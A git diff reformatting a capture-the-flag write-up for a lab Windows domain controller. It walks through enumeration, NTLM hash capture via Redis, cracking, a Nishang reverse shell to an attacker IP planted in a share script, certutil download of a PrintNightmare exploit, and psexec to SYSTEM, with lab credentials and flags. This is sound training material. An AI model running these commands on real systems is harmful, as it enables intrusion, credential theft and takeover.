@@ -25,7 +25,7 @@ This lab features an attack vector starting from a **misconfigured NoSQL** datab
 The engagement begins with a comprehensive port scan to identify all available services:
 
 ```Bash
-sudo nmap -sC -sV -v -Pn -p- 10.81.130.174
+$ sudo nmap -sC -sV -v -Pn -p- 10.81.130.174
 ```
 
 Key Open Ports:
@@ -52,8 +52,8 @@ The host is identified as a **Domain Controller** based on the following:
 Initial enumeration using **enum4linux** and **kerbrute** confirms the domain name and identifies a valid administrative account:  
 
 ```Bash
-enum4linux -a 10.81.130.174
-./kerbrute_linux_amd64 userenum -d VULNNET.local --dc 10.81.130.174 users3.txt
+$ enum4linux -a 10.81.130.174
+$ ./kerbrute_linux_amd64 userenum -d VULNNET.local --dc 10.81.130.174 users3.txt
 ```
 
 Results:
@@ -69,15 +69,14 @@ Results:
 Port **6379 (Redis)** is an unusual find on a DC. Version 2.8.x is legacy and often lacks authentication.
 
 ```Bash
-# Attempting unauthenticated access  
-redis-cli -h 10.81.130.174
+$ redis-cli -h 10.81.130.174 # Attempting unauthenticated access  
 ```
 
 Access is granted without a password. To escalate this, we use Responder to capture the **NTLMv2 hash** of the service account by forcing Redis to access a fake remote directory.
 
 ```Bash
-sudo responder -I tun0 -dwv # Start Responder on the attacker machine
-10.81.130.174:6379> CONFIG SET dir \\192.168.144.226\fakefolder\ # Inside Redis CLI, trigger a connection to the attacker's IP
+$ sudo responder -I tun0 -dwv # Start Responder on the attacker machine
+> CONFIG SET dir \\192.168.144.226\fakefolder\ # Inside Redis CLI, trigger a connection to the attacker's IP
 ```
 
 ---
@@ -101,15 +100,15 @@ Using hashcat with the **rockyou.txt** wordlist:
 
 Using the recovered credentials, we re-scan the SMB shares:  
 
-```Bash  
-enum4linux -u enterprise-security -p sand_0873959498 -a 10.81.130.174
+```Bash
+$ enum4linux -u enterprise-security -p sand_0873959498 -a 10.81.130.174
 ```
 
 An interesting share named **Enterprise-Share** is found. Inside, there is a PowerShell script:  
 * PurgeIrrelevantData_1826.ps1
 
-```PowerShell  
-# Content of the script:  
+```PowerShell
+# Content of the script:
 rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
 ```
 
@@ -119,12 +118,15 @@ rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
 
 Since our user has write access to this share, we can replace the script with a **Nishang** (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell:  
 
-```Bash  
-# Append Nishang payload to the script  
-Invoke-PowerShellTcp -Reverse -IPAddress 192.168.144.226 -Port 4444  
-smbclient //10.81.130.174/Enterprise-Share -U VULNNET.local/enterprise-security%sand_0873959498  
-put PurgeIrrelevantData_1826.ps1  
-```  
+```Bash
+# Append payload to the Nishang script:
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.144.226 -Port 4444
+```
+
+```Bash
+$ smbclient //10.81.130.174/Enterprise-Share -U VULNNET.local/enterprise-security%sand_0873959498
+> put PurgeIrrelevantData_1826.ps1
+```
 
 After a few seconds, a shell is received:  
 * **User Flag:** THM{3eb176aee96432d5b100bc93580b291e}
@@ -137,10 +139,10 @@ After a few seconds, a shell is received:
 
 Checking the **Spooler** service and missing patches for CVE-2021-34527:  
 
-```PowerShell  
-Get-Service Spooler # Status: Running  
-Get-HotFix | Where-Object { $_.HotFixID -match "KB5004945|KB5005033" } # Result: Empty  
-```  
+```PowerShell
+> Get-Service Spooler # Status: Running
+> Get-HotFix | Where-Object { $_.HotFixID -match "KB5004945|KB5005033" } # Result: Empty
+```
 
 ---
 
@@ -148,17 +150,17 @@ Get-HotFix | Where-Object { $_.HotFixID -match "KB5004945|KB5005033" } # Result:
 
 We upload a **PrintNightmare** exploit (https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1) to the target:  
 
-```PowerShell  
-certutil -urlcache -split -f http://192.168.144.226/CVE-2021-1675.ps1 C:\Users\enterprise-security\Desktop\nightmare.ps1  
-Import-Module C:\Users\enterprise-security\Desktop\nightmare.ps1  
-Invoke-Nightmare -NewUser "overmane" -NewPassword "Passwd123"  
+```PowerShell
+> certutil -urlcache -split -f http://192.168.144.226/CVE-2021-1675.ps1 C:\Users\enterprise-security\Desktop\nightmare.ps1
+> Import-Module C:\Users\enterprise-security\Desktop\nightmare.ps1
+> Invoke-Nightmare -NewUser "overmane" -NewPassword "Passwd123"
 ```  
 
 The exploit creates a **new local administrator**. We then use impacket-psexec to gain **SYSTEM** access:  
 
-```Bash  
-impacket-psexec VULNNET.local/overmane:Passwd123@10.81.130.174  
-```  
+```Bash
+$ impacket-psexec VULNNET.local/overmane:Passwd123@10.81.130.174
+```
 
 **System Flag:** THM{d540c0645975900e5bb9167aa431fc9b}
 
